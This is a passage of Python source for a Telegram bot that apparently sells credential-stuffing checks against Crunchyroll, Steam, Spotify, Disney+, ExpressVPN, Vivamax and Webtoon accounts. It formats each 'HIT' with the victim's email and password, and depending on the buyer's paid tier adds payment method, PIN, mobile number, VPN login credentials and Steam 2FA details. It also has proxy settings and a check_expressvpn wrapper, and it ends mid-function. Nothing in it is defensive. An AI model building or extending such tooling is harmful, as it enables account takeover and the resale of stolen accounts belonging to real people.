            f"\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Your Plan Benefits:</b> <code>{get_plan_with_emoji(user_plan)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{benefits_lines}"
        )
    # =================================================================
    
    text = f"""
📡 <b>API Mode Selection</b>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_proxyless_banner(stats.get("proxy_enabled", False) if user_id != ADMIN_ID else is_global_proxy_enabled(), get_pool_size(user_id))}
<b>Current Mode:</b> <code>{mode_info["color"]} {mode_info["display"]}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{mode_info["icon"]} <b>{mode_info["display"]}</b>
{features_text}{steam_benefits}{crunchyroll_benefits}{expressvpn_benefits}
━━━━━━━━━━━━━━━━━━━━━━━━
Click on a mode below to switch:
    """.strip()

    # ====================== FULLY DYNAMIC KEYBOARD (CLEAN BUTTONS - NO "MODE") ======================
    keyboard = []
    modes_list = list(MODES.keys())
    
    # Main modes (everything except Steam)
    main_modes = [m for m in modes_list if m != "Steam"]

    # Create rows of 2 buttons for main modes
    for i in range(0, len(main_modes), 2):
        row = []
        for mode_key in main_modes[i:i+2]:
            info = MODES[mode_key]
            # === CLEAN BUTTON TEXT - REMOVED " Mode" ===            
            clean_name = info["display"].replace(" Mode", "").strip()
            enabled = is_mode_enabled(mode_key)
            if enabled:
                button_text = f"✅ {info['icon']} {clean_name}" if mode_key == current_mode else f"{info['icon']} {clean_name}"
            else:
                button_text = f"🔘 {info['icon']} {clean_name}"
            row.append(InlineKeyboardButton(button_text, callback_data=f"set_mode:{mode_key}"))
        keyboard.append(row)
    
    # Last row: Steam + Back to Settings
    steam_info = MODES["Steam"]
    clean_steam_name = steam_info["display"].replace(" Mode", "").strip()
    enabled = is_mode_enabled("Steam")
    if enabled:
        steam_text = f"✅ {steam_info['icon']} {clean_steam_name}" if current_mode == "Steam" else f"{steam_info['icon']} {clean_steam_name}"
    else:
        steam_text = f"🔘 {steam_info['icon']} {clean_steam_name}"

    keyboard.append([
        InlineKeyboardButton(steam_text, callback_data="set_mode:Steam"),
        InlineKeyboardButton("↼ Back to Settings", callback_data="menu_settings")
    ])

    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

def format_hit_for_file(result, user_plan="FREE", mode="Crunchyroll"):
    """Tiered formatting for the downloaded Hits .txt file"""
    country_code = result.get('country', 'ZZ').upper()
    flag = REGION_HINTS.get(country_code, "🌍")
    expiry_display = get_days_remaining(result['expiry']) if result.get('expiry') else 'N/A'

    # ==================== SPECIAL CASE: VIVAMAX CANCELLED ====================
    if mode == "Vivamax":
        message = result.get('message', '')
        status = result.get('status', '').strip().upper()

        if message == "Subscription Cancelled" or status == "CANCELLED":
            return f"""⚠️ VIVAMAX CANCELLED
━━━━━━━━━━━━━━━━━━━━━━━
📧 Email      : {result['email']}
🔑 Password   : {result['password']}
✉️ Email Verified : {result.get('email_verified', 'N/A')}
━━━━━━━━━━━━━━━━━━━━━━━
👤 Name       : {result.get('displayName', result.get('username', 'N/A'))}
📊 Status     : CANCELLED
📌 Plan       : {result.get('plan', 'Unknown')}
🎞️ Max Streams: {result.get('max_streams', '1')}
💰 Price      : {result.get('price', 'N/A')}
📆 Billing    : {result.get('billing', 'N/A')}
📅 Expires    : {expiry_display}
⏳ Days Left  : {result.get('days_left', 'N/A')}
🔄 Auto Renew : {result.get('auto_renew', '—')}
💳 Payment    : {result.get('payment_method', 'N/A')}
📅 Sub Start  : {result.get('subscription_start', 'N/A')}
🔐 PIN        : {result.get('pin', 'N/A')}
📨 Receive Promos : {result.get('receive_promos', 'No')}
━━━━━━━━━━━━━━━━━━━━━━━
🌍 Register Location : {result.get('register_location', 'N/A')}
📱 Mobile     : {result.get('mobile', 'N/A')}
🌍 Country    : {country_code} {flag}
━━━━━━━━━━━━━━━━━━━━━━━
✅ Valid login • Subscription has been cancelled
━━━━━━━━━━━━━━━━━━━━━━━
Generated by @caydigitals | @clydecrunchybot
"""

    if mode == "Webtoon":
        nickname = result.get('nickname', 'N/A')
        login_id = result.get('loginId', 'N/A')
        login_type = result.get('loginType', 'N/A')
        ad_free = "Yes" if result.get('adFree') else "No"

        return f"""📚 WEBTOON HIT!
━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email      : {result['email']}
🔑 Password   : {result['password']}
📊 Status     : Active
👤 Nickname   : {nickname}
🆔 Login ID   : {login_id}
📊 Login Type : {login_type}
📣 Ad-Free    : {ad_free}
━━━━━━━━━━━━━━━━━━━━━━━━
✅ Valid Webtoon Account
Generated by @caydigitals | @clydecrunchybot
"""

    if mode == "Disney+":
        plan = result.get('plan', 'Unknown')
        if "[" in plan and "]" in plan:
            plan = plan.split("[", 1)[1].split("]", 1)[0]

        return f"""🏰 DISNEY+ HIT!
━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email          : {result['email']}
🔑 Password       : {result['password']}
📊 Status         : {result.get('status', 'HIT')}
📌 Plan           : {plan}
✅ Email Verified : {result.get('EmailVerified', 'Unknown')}
🎟️ Free Trial     : {result.get('Free Trial', 'false')}
📅 Next Renewal   : {result.get('Next Renewal Date', 'N/A')}
━━━━━━━━━━━━━━━━━━━━━━━━
Generated by @caydigitals | @clydecrunchybot
"""

    if mode == "ExpressVPN":
            lines = [
                "✅ EXPRESSVPN HIT!",
                f"📧 Email       : {result['email']}",
                f"🔑 Password    : {result['password']}",
                f"━━━━━━━━━━━━━━━━━━━━━━━",
                f"📌 Plan        : {result.get('plan', 'Unknown')}",
                f"📅 Expires     : {result.get('expiry', 'N/A')}",
                f"⏳ Days Left   : {result.get('days_left', 'N/A')}",
                f"🔄 Auto Renew  : {result.get('auto_renew', '—')}",
                f"💳 Payment     : {result.get('payment_method', 'N/A')}",
                f"🔑 License     : {result.get('license', 'N/A')}",
                "",
                "━━━━━━━━━━━━━━━━━━━━━━━ CREDENTIALS ━━━━━━━━━━━━━━━━━━━━━━━",
                f"🔐 OVPN        : {result.get('ovpn_user', 'N/A')}:{result.get('ovpn_pass', 'N/A')}",
                f"🔐 PPTP        : {result.get('pptp_user', 'N/A')}:{result.get('pptp_pass', 'N/A')}",
                "━━━━━━━━━━━━━━━━━━━━━━━",
                ""
            ]
            return "\n".join(lines) + "\n"

    if mode == "Steam":
        twofa_type = result.get('twofa_type', 'None')
        if result.get('twofa'):
            line = f"🔐 2FA:{twofa_type} | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
        else:
            line = f"✅ HIT | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
        
        if result.get('games_count') is not None:
            line += f" | Games: {result.get('total_games_owned', result.get('games_count', 0))} | Playtime: {result.get('total_playtime', 0)}h"
        
        return line + "\n"

    if mode == "Spotify":
        plan_emoji = "💚" if result.get('plan') == 'Premium' else "🆓"
        return f"""🎵 SPOTIFY HIT!
━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email    : {result['email']}
🔑 Password : {result['password']}
━━━━━━━━━━━━━━━━━━━━━━━━
👤 Name     : {result.get('display_name', 'Unknown')}
🆔 Username : {result.get('username', 'Unknown')}
{plan_emoji} Plan     : {result.get('plan', 'Unknown')}
🌍 Country  : {result.get('country', 'Unknown')}
━━━━━━━━━━━━━━━━━━━━━━━━
Generated by @caydigitals | @clydecrunchybot
"""

    if mode == "Vivamax":
        # === VIVAMAX RICH FORMAT (same as your standalone script) ===
        base = f"✅ VIVAMAX HIT!\n"
        base += f"📧 Email: {result['email']}\n"
        base += f"🔑 Password: {result['password']}\n"
        base += f"👤 Name: {result.get('displayName', result.get('username', 'N/A'))}\n"
        base += f"📊 Status: {result.get('status', 'UNKNOWN')}\n"
        base += f"📌 Plan: {result.get('plan', 'Unknown')}\n"
        base += f"🎞️ Max Streams: {result.get('max_streams', '1')}\n" 
        base += f"💰 Price: {result.get('price', 'N/A')}\n"
        base += f"📆 Billing: {result.get('billing', 'N/A')}\n"
        base += f"📅 Expires: {expiry_display}\n"
        base += f"⏳ Days Left: {result.get('days_left', 'N/A')}\n"
        base += f"🔄 Auto Renew: {result.get('auto_renew', '—')}\n"
        base += f"💳 Payment: {result.get('payment_method', 'N/A')}\n"
        base += f"📅 Sub Start: {result.get('subscription_start', 'N/A')}\n"
        base += f"🔐 PIN: {result.get('pin', 'N/A')}\n"
        base += f"📱 Mobile: {result.get('mobile', 'N/A')}\n"
        base += f"🌍 Country: {country_code} {flag}\n"
        base += f"🎂 Birthday: {result.get('birthday', 'N/A')}\n"
        base += f"📨 Receive Promos: {result.get('receive_promos', 'No')}\n"
        base += f"📥 Next Download: {result.get('next_download', 'N/A')}\n"
        base += f"📱 Device: {result.get('device_name', 'N/A')} ({result.get('device_type', 'N/A')})\n"
        base += f"🔄 Last Updated: {result.get('last_updated', 'N/A')}\n"
        return base + "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    else:
        base = f"✅ CRUNCHYROLL HIT!\n"
        base += f"📧 Email: {result['email']}\n"
        base += f"🔑 Password: {result['password']}\n"
        base += f"📊 Plan: {result['plan']}\n"
        base += f"📆 Expires: {expiry_display}\n"
        base += f"🌍 Country: {country_code} {flag}\n"

    #CRUNCHYROLL
    if user_plan == "FREE":
        return base + "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    elif user_plan == "BASIC":
        extra = f"• User: {result.get('username', 'Unknown')}\n"
        extra += f"• Verified: {result['email_verified']}\n"
        extra += f"• Free Trial: {result['free_trial']}\n"
        return base + extra + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    elif user_plan in ["VIP"]:
        extra = f"• User: {result.get('username', 'Unknown')}\n"
        extra += f"• Verified: {result['email_verified']}\n"
        extra += f"• Created: {result['account_creation'] or 'N/A'}\n"
        extra += f"• Free Trial: {result['free_trial']}\n"
        extra += f"• Plan(SUB): {result.get('plan_sub', 'Unknown')}\n"
        extra += f"• Max Streams: {result.get('max_streams', 'Unknown')}\n"
        extra += f"• Currency: {result['currency'] or 'N/A'}\n"
        extra += f"• Payment: {result.get('payment_method', 'Unknown')}\n"
        return base + extra + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    else:  # YEARLY
        extra = f"• User: {result.get('username', 'Unknown')}\n"
        extra += f"• Verified: {result['email_verified']}\n"
        extra += f"• Created: {result['account_creation'] or 'N/A'}\n"
        extra += f"• Free Trial: {result['free_trial']}\n"
        extra += f"• Plan(SUB): {result.get('plan_sub', 'Unknown')}\n"
        extra += f"• Max Streams: {result.get('max_streams', 'Unknown')}\n"
        extra += f"• Currency: {result['currency'] or 'N/A'}\n"
        extra += f"• Payment: {result.get('payment_method', 'Unknown')}\n"
        extra += f"• Auto Renewal: {result.get('auto_renewal', 'N/A')}\n"
        extra += f"• Sub Start: {result.get('subscription_start', 'N/A')}\n"
        extra += f"• Billing: {result.get('billing_interval', 'N/A')}\n"
        names = ', '.join(result.get('profile_names', [])) or 'N/A'
        extra += f"• Profiles ({result.get('profile_count', 'N/A')}): {names}\n"
        extra += f"• Language: {result.get('preferred_language', 'N/A')}\n"
        return base + extra + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

def format_single_result(result, user_plan="FREE", mode="Crunchyroll"):
    """Mode-aware formatting: Crunchyroll keeps original tiered look, Vivamax gets rich display"""
    country_code = result.get('country', 'ZZ').upper()
    flag = REGION_HINTS.get(country_code, "🌍")
    country_display = f"{country_code} {flag}" if country_code not in ["ZZ", "UNKNOWN", "", "Unknown"] else "Not Set"

    expiry_display = get_days_remaining(result.get('expiry')) if result.get('expiry') else 'N/A'

    # ==================== FAILURE / NON-HIT CASES ====================
    if not result.get('success', False):
        message = result.get('message', '')

        # SPECIAL CASE: Vivamax Cancelled Subscription
        if mode == "Vivamax" and message == "Subscription Cancelled":
            return f"""
⚠️ <b>VIVAMAX CANCELLED</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
✉️ <b>Email Verified:</b> <code>{result.get('email_verified', 'N/A')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> <code>{result.get('displayName', result.get('username', 'N/A'))}</code>
📊 <b>Status:</b> <code>CANCELLED</code>
📌 <b>Plan:</b> <code>{result.get('plan', 'Unknown')}</code>
🎞️ <b>Max Streams:</b> <code>{result.get('max_streams', '1')}</code>
💰 <b>Price:</b> <code>{result.get('price', 'N/A')}</code>
📆 <b>Billing:</b> <code>{result.get('billing', 'N/A')}</code>
📅 <b>Expires:</b> <code>{expiry_display}</code>
⏳ <b>Days Left:</b> <code>{result.get('days_left', 'N/A')}</code>
🔄 <b>Auto Renew:</b> <code>{result.get('auto_renew', '—')}</code>
💳 <b>Payment:</b> <code>{result.get('payment_method', 'N/A')}</code>
📅 <b>Sub Start:</b> <code>{result.get('subscription_start', 'N/A')}</code>
🔐 <b>PIN:</b> <code>{result.get('pin', 'N/A')}</code>
📨 <b>Receive Promos:</b> <code>{result.get('receive_promos', 'No')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
🌍 <b>Register Location:</b> <code>{result.get('register_location', 'N/A')}</code>
📱 <b>Mobile:</b> <code>{result.get('mobile', 'N/A')}</code>
🌍 <b>Country:</b> <code>{country_display}</code>

<i>✅ Valid login • Subscription has been cancelled</i>
━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
            """.strip()

        status_msg = result.get('message') or 'Temporary check failure — try again'
        return f"""
❌ <b>CHECK FAILED</b>

📧 <b>Email:</b> <code>{result['email']}</code>

📌 <b>Status:</b> {status_msg}

Try another account!
        """.strip()


    if mode == "Spotify":
        plan_emoji = "💚" if result.get('plan') == 'Premium' else "🆓"
        return f"""
🎵 <b>SPOTIFY HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> <code>{result.get('display_name', 'Unknown')}</code>
🆔 <b>Username:</b> <code>{result.get('username', 'Unknown')}</code>
{plan_emoji} <b>Plan:</b> <code>{result.get('plan', 'Unknown')}</code>
🌍 <b>Country:</b> <code>{result.get('country', 'Unknown')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
        """.strip()

# ==================== WEBTOON ====================
    if mode == "Webtoon":
        nickname = result.get('nickname', 'N/A')
        login_type = result.get('loginType') or 'EMAIL'
        ad_free = "✅ Yes" if result.get('adFree') else "❌ No"
        profile_url = result.get('profileUrl') or 'Not Set'

        return f"""
📚 <b>WEBTOON HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
👤 <b>Nickname:</b> <code>{nickname}</code>
━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Status:</b> <code>Active</code>
📊 <b>Login Type:</b> <code>{login_type}</code>
📣 <b>Ad-Free:</b> {ad_free}
🖼️ <b>Profile URL:</b> {profile_url}

━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
        """.strip()

    # ==================== DISNEY+ ====================
    if mode == "Disney+":
        plan = result.get('plan', 'Unknown')
        # Clean up the plan name
        if "[" in plan and "]" in plan:
            plan = plan.split("[", 1)[1].split("]", 1)[0]

        return f"""
🏰 <b>DISNEY+ HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Status:</b> <code>{result.get('status', 'HIT')}</code>
📌 <b>Plan:</b> <code>{plan}</code>
✅ <b>Email Verified:</b> <code>{result.get('EmailVerified', 'Unknown')}</code>
🎟️ <b>Free Trial:</b> <code>{result.get('Free Trial', 'false')}</code>
📅 <b>Next Renewal:</b> <code>{result.get('Next Renewal Date', 'N/A')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
        """.strip()

# ==================== EXPRESSVPN (PLAN-AWARE) ====================
    if mode == "ExpressVPN":
        if user_plan == "FREE":
            # Limited view for FREE users
            return f"""
✅ <b>EXPRESSVPN HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━
📌 <b>Plan:</b> <code>{result.get('plan', 'Unknown')}</code>
📅 <b>Expires:</b> <code>{result.get('expire_date', 'N/A')}</code>
⏳ <b>Days Left:</b> <code>{result.get('days_left', 'N/A')}</code>
🔄 <b>Auto Renew:</b> <code>{'Yes' if result.get('auto_renew') else 'No'}</code>
💳 <b>Payment:</b> <code>{result.get('payment_method', 'N/A')}</code>
🔑 <b>License:</b> <code>{result.get('license', 'N/A')}</code>

━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
            """.strip()
        else:
            return f"""
✅ <b>EXPRESSVPN HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━
📌 <b>Plan:</b> <code>{result.get('plan', 'Unknown')}</code>
📅 <b>Expires:</b> <code>{result.get('expire_date', 'N/A')}</code>
⏳ <b>Days Left:</b> <code>{result.get('days_left', 'N/A')}</code>
🔄 <b>Auto Renew:</b> <code>{'Yes' if result.get('auto_renew') else 'No'}</code>
💳 <b>Payment:</b> <code>{result.get('payment_method', 'N/A')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
🔑 <b>License:</b> <code>{result.get('license', 'N/A')}</code>
🔐 <b>OVPN:</b> <code>{result.get('ovpn_user', 'N/A')}:{result.get('ovpn_pass', 'N/A')}</code>
🔐 <b>PPTP:</b> <code>{result.get('pptp_user', 'N/A')}:{result.get('pptp_pass', 'N/A')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
✅ .ovpn file has been sent below 👇
━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
            """.strip()

    # ==================== STEAM ====================
    if mode == "Steam":
        visibility_emoji = "✅" if result.get('profile_visibility') == "Public" \
            else "🔒" if result.get('profile_visibility') == "Private" \
            else "👥"

        # Base header — no separator here
        text = f"""✅ <b>STEAM HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>SteamID:</b> <code>{result.get('steamid', 'Unknown')}</code>
👤 <b>Name:</b> <code>{result.get('profile_name', 'Unknown')}</code>
🌍 <b>Country:</b> {country_display if country_code not in ["Unknown", "ZZ", "", "UNKNOWN"] else "Not Set by User"}"""
        if result.get('limited'):
            text += f"\n⚠️ <b>Limited Account:</b> <code>Yes (no purchases)</code>"
        # 2FA — separator ONLY appears when 2FA exists
        if result.get('twofa'):
            twofa_type = result.get('twofa_type', 'Unknown')
            if twofa_type == 'Authenticator':
                note = "Needs TOTP authenticator app"
            elif twofa_type == 'Email Guard':
                note = "Needs email inbox access"
            else:
                note = "Device confirmation needed"
            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━"
            text += f"\n🔐 <b>2FA Type:</b> <code>{twofa_type}</code>"
            text += f"\n📝 <b>Note:</b> {note}"

        # BASIC+ — profile + games
        if user_plan in ["BASIC", "VIP", "YEARLY", "OWNER"]:
            if result.get('games_count') == 0 and result.get('profile_visibility') == 'Public':
                games_privacy = "Hidden 🔒"
            else:
                games_privacy = "Visible ✅"
            result['games_privacy'] = games_privacy

            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━"
            text += f"\n{visibility_emoji} <b>Profile:</b> <code>{result.get('profile_visibility', 'Unknown')}</code>"
            if result.get('profile_url'):
                text += f"\n🔗 <b>Profile Url:</b> <a href='{result['profile_url']}'>View on Steam</a>"
            text += f"\n🎮 <b>Games List:</b> <code>{result.get('games_privacy', 'Unknown')}</code>"

            owned = result.get('total_games_owned', 0)
            played = result.get('games_count', 0)
            if played == 0:
                text += "\n🎮 <b>Games Owned:</b> <code>0</code> <i>(Private/Family View)</i>"
            elif owned > played:
                text += f"\n🎮 <b>Games Owned:</b> <code>{owned}</code> <i>(+{owned - played} unplayed)</i>"
            else:
                text += f"\n🎮 <b>Games Owned:</b> <code>{played}</code>"

        # VIP/YEARLY/OWNER — playtime + top 3 games preview only
        if user_plan in ["VIP", "YEARLY", "OWNER"]:
            if result.get('total_playtime', 0) > 0:
                pt = result.get('total_playtime_display', f"{result['total_playtime']:,}h")
                text += f"\n⏳ <b>Total Playtime:</b> <code>{pt}</code>"

            # Ban info
            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━"
            if result.get('vac_banned'):
                vac_status = f"⚠️ VAC BANNED x{result.get('number_of_vac_bans', 1)} ({result.get('days_since_last_ban', 0)}d ago)"
            else:
                vac_status = "✅ Clean"
            comm_status = "⚠️ Banned" if result.get('community_banned') else "✅ Clean"
            trade_status = "⚠️ Banned" if result.get('trade_banned') else "✅ Clean"
            text += f"\n🛡️ <b>VAC Status:</b> <code>{vac_status}</code>"
            text += f"\n👥 <b>Community Ban:</b> <code>{comm_status}</code>"
            text += f"\n💱 <b>Trade Ban:</b> <code>{trade_status}</code>"

            # ← VIP ONLY gets Top 5 — YEARLY/OWNER skip this and get Top 10 below
            if user_plan == "VIP" and result.get('games'):
                text += f"\n━━━━━━━━━━━━━━━━━━━━━━━"
                text += "\n🔥 <b>Top 5 Games:</b>"
                for game in result['games'][:5]:
                    pt = game.get('playtime_display', f"{game['playtime_hours']}h")
                    text += f"\n   • {game['name']} ({pt})"
                if len(result['games']) > 5:
                    text += f"\n   <i>+ {len(result['games']) - 5} more in file below 👇</i>"

        # YEARLY+ — extra details
        if user_plan in ["YEARLY", "OWNER"]:
            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━"
            text += f"\n🏆 <b>Steam Level:</b> <code>{result.get('steam_level', 0)}</code>"
            text += f"\n👥 <b>Friends:</b> <code>{result.get('friends_count', 0)}</code>"

            # Recent games (last 2 weeks)
            if result.get('recent_games'):
                text += f"\n🕹️ <b>Recent Games (2 weeks):</b>"
                for game in result['recent_games'][:5]:
                    mins = game['playtime_2weeks']
                    pt = f"{mins // 60}h {mins % 60}m" if mins >= 60 else f"{mins}m"
                    text += f"\n   • {game['name']} ({pt})"

            # Top 10 games (upgrade from VIP's top 5)
            if result.get('games'):
                text += f"\n━━━━━━━━━━━━━━━━━━━━━━━"
                text += "\n🔥 <b>Top 10 Games:</b>"
                for game in result['games'][:10]:
                    pt = game.get('playtime_display', f"{game['playtime_hours']}h")
                    text += f"\n   • {game['name']} ({pt})"
                if len(result['games']) > 10:
                    text += f"\n   <i>+ {len(result['games']) - 10} more in file below 👇</i>"

        # Single footer — always at the bottom
        text += f"\n━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += f"BY @caydigitals | "
        text += f"<a href='https://t.me/clydecrunchybot'>BOT</a> | "
        text += f"<a href='https://t.me/caysredirect'>Channel</a>"
        return text
    
    # ==================== VIVAMAX ====================
    if mode == "Vivamax":
        return f"""
✅ <b>VIVAMAX HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
✉️ <b>Email Verified:</b> <code>{result.get('email_verified', 'N/A')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> <code>{result.get('displayName', result.get('username', 'N/A'))}</code>
📊 <b>Status:</b> <code>{result.get('status', 'UNKNOWN')}</code>
📌 <b>Plan:</b> <code>{result.get('plan', 'Unknown')}</code>
{f"📋 <b>All Plans:</b>" + chr(10) + result.get('all_plans_detail', '') + chr(10) if result.get('active_subs_count', 0) > 1 else ""}🎞️ <b>Max Streams:</b> <code>{result.get('max_streams', '1')}</code>
💰 <b>Price:</b> <code>{result.get('price', 'N/A')}</code>
📆 <b>Billing:</b> <code>{result.get('billing', 'N/A')}</code>
📅 <b>Expires:</b> <code>{expiry_display}</code>
⏳ <b>Days Left:</b> <code>{result.get('days_left', 'N/A')}</code>
🔄 <b>Auto Renew:</b> <code>{result.get('auto_renew', '—')}</code>
💳 <b>Payment:</b> <code>{result.get('payment_method', 'N/A')}</code>
📅 <b>Sub Start:</b> <code>{result.get('subscription_start', 'N/A')}</code>
🔐 <b>PIN:</b> <code>{result.get('pin', 'N/A')}</code>
📨 <b>Receive Promos:</b> <code>{result.get('receive_promos', 'No')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
🌍 <b>Register Location:</b> <code>{result.get('register_location', 'N/A')}</code>
📱 <b>Mobile:</b> <code>{result.get('mobile', 'N/A')}</code>
🌍 <b>Country:</b> <code>{country_display}</code>

━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
        """.strip()

    # ==================== CRUNCHYROLL ====================
    header = f"""
✅ <b>CRUNCHYROLL HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━
💎 PREMIUM ACCOUNT
━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Account Details</b>
- <b>Active:</b> ✅ {result.get('active', 'False')}
- <b>Plan:</b> <code>{result.get('plan', 'None')}</code>
- <b>Expires In:</b> <code>{expiry_display}</code>
- <b>Country:</b> <code>{country_display}</code>"""
    if user_plan == "FREE":
        return (header + f"""

━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
""").strip()

    elif user_plan == "BASIC":
        return (header + f"""
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Account Info</b>
- <b>User:</b> <code>{result.get('username', 'Unknown')}</code>
- <b>Verified:</b> <code>{result.get('email_verified', 'No')}</code>
- <b>Free Trial:</b> <code>{result.get('free_trial', 'False')}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Subscription</b>
- <b>Payment:</b> <code>{result.get('payment_method', 'Unknown')}</code>

━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
""").strip()

    elif user_plan == "VIP":
        return (header + f"""
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Account Info</b>
- <b>User:</b> <code>{result.get('username', 'Unknown')}</code>
- <b>Verified:</b> <code>{result.get('email_verified', 'No')}</code>
- <b>Created:</b> <code>{result.get('account_creation', 'N/A')}</code>
- <b>Free Trial:</b> <code>{result.get('free_trial', 'False')}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Subscription</b>
- <b>Plan(SUB):</b> <code>{result.get('plan_sub', 'Unknown')}</code>
- <b>Max Streams:</b> <code>{result.get('max_streams', 'Unknown')}</code>
- <b>Currency:</b> <code>{result.get('currency', 'N/A')}</code>
- <b>Payment:</b> <code>{result.get('payment_method', 'Unknown')}</code>
- <b>Auto Renewal:</b> <code>{result.get('auto_renewal', 'N/A')}</code>

━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
""").strip()

    else:  # YEARLY / OWNER
        return (header + f"""
━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Account Info</b>
- <b>User:</b> <code>{result.get('username', 'Unknown')}</code>
- <b>Verified:</b> <code>{result.get('email_verified', 'No')}</code>
- <b>Created:</b> <code>{result.get('account_creation', 'N/A')}</code>
- <b>Free Trial:</b> <code>{result.get('free_trial', 'False')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Subscription</b>
- <b>Plan(SUB):</b> <code>{result.get('plan_sub', 'Unknown')}</code>
- <b>Max Streams:</b> <code>{result.get('max_streams', 'Unknown')}</code>
- <b>Currency:</b> <code>{result.get('currency', 'N/A')}</code>
- <b>Payment:</b> <code>{result.get('payment_method', 'Unknown')}</code>
- <b>Auto Renewal:</b> <code>{result.get('auto_renewal', 'N/A')}</code>
- <b>Sub Start:</b> <code>{result.get('subscription_start', 'N/A')}</code>
- <b>Billing:</b> <code>{result.get('billing_interval', 'N/A')}</code>
━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Profiles ({result.get('profile_count', '0')})</b>
- <code>{', '.join(result.get('profile_names', [])) or 'N/A'}</code>
- <b>Language:</b> <code>{result.get('preferred_language', 'N/A')}</code>

━━━━━━━━━━━━━━━━━━━━━━━
BY @caydigitals | <a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>
""").strip()

def check_expressvpn(email: str, password: str, proxy=None):
    """ExpressVPN Checker - works exactly like Crunchyroll / Steam / Vivamax"""
    checker = ExpressVPNChecker(proxy=proxy)
    raw_result = checker.check_account(email, password)

    # Convert to the same format your bot expects
    data = raw_result.get('data', {})
    final_status = raw_result.get('status', 'FAIL')
    is_hit = final_status in ('PREMIUM', 'TRIAL')
    
    return {
        'email': email,
        'password': password,
        'success': is_hit,
        'message': '' if is_hit else (raw_result.get('error') or final_status),
        'plan': data.get('plan', 'Unknown'),
